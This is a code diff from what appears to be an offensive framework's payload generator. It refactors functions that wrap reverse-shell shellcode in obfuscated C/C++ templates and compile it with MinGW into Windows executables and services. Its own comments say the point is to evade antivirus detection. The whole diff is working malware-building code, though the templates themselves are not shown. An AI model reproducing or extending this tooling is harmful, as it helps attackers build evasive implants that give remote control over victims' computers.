@@ -128,7 +128,8 @@ class Payload(object):
                 context = data_return(305, Payload_MSG.get(305), {})
                 return context
             byteresult = base64.b64decode(result.get('payload'))
-            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult)
+            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
+                                                          template="REVERSE_HEX_BASE")
             filename = "{}.exe".format(int(time.time()))
         elif opts.get("Format") == "exe-src-service":
             opts["Format"] = "hex"
@@ -138,7 +139,7 @@ class Payload(object):
                 return context
             byteresult = base64.b64decode(result.get('payload'))  # result为None会抛异常
             byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
-                                                          payload_type="REVERSE_HEX_AS_SERVICE")
+                                                          template="REVERSE_HEX_AS_SERVICE")
             filename = "{}.exe".format(int(time.time()))
         # linux类型免杀
         elif opts.get("Format") == "elf-src":
@@ -250,7 +251,7 @@ class Payload(object):
         return byteresult
 
     @staticmethod
-    def generate_bypass_exe(mname=None, opts=None, service_exe=False):
+    def generate_bypass_exe(mname=None, opts=None, template="REVERSE_HEX_BASE"):
         """生成免杀的exe,随版本不断更新"""
         # 处理RHOST及LHOST参数
         if mname.find("reverse") > 0:
@@ -282,27 +283,13 @@ class Payload(object):
         if result is None:
             return None
         shellcode = base64.b64decode(result.get('payload'))
-        if service_exe:
-            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode,
-                                                          payload_type="REVERSE_HEX_AS_SERVICE")
-        else:
-            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode)
+
+        byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode,
+                                                      template=template)
         return byteresult
 
     @staticmethod
-    def _create_payload_by_mingw(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
-        if payload_type == "REVERSE_HEX":
-            env = Environment(loader=FileSystemLoader(MINGW_CODE_TEMPLATE_DIR))
-            tpl = env.get_template('REVERSE_HEX.c')
-            reverse_hex_str = bytes.decode(shellcode)[::-1]
-            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
-        elif payload_type == "REVERSE_HEX_AS_SERVICE":
-            env = Environment(loader=FileSystemLoader(MINGW_CODE_TEMPLATE_DIR))
-            tpl = env.get_template('REVERSE_HEX_AS_SERVICE.c')
-            reverse_hex_str = bytes.decode(shellcode)[::-1]
-            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
-        else:
-            raise Exception('unspport type')
+    def _create_payload_by_mingw(mname=None, shellcode=None, template="REVERSE_HEX"):
 
         if mname.startswith('windows/x64'):
             arch = 'x64'
@@ -310,8 +297,24 @@ class Payload(object):
             arch = 'x86'
         else:
             raise Exception('unspport mname')
-        mingwx64 = Mingw(MINGW_INCULDE_DIR, src)
-        byteresult = mingwx64.compile_c(arch=arch)
+
+        env = Environment(loader=FileSystemLoader(MINGW_CODE_TEMPLATE_DIR))
+
+        if template in ["REVERSE_HEX", "REVERSE_HEX_AS_SERVICE"]:
+            tpl = env.get_template(f'{template}.c')
+            reverse_hex_str = bytes.decode(shellcode)[::-1]
+            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
+            mingwx64 = Mingw(MINGW_INCULDE_DIR, src)
+            byteresult = mingwx64.compile_c(arch=arch)
+        elif template in ["REVERSE_HEX_BASE", "REVERSE_HEX_GUARD", "REVERSE_HEX_MUTEX"]:
+            tpl = env.get_template(f'{template}.cpp')
+            reverse_hex_str = bytes.decode(shellcode)[::-1]
+            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
+            mingwx64 = Mingw(MINGW_INCULDE_DIR, src)
+            byteresult = mingwx64.compile_cpp(arch=arch)
+        else:
+            raise Exception('unspport template')
+
         return byteresult
 
     @staticmethod
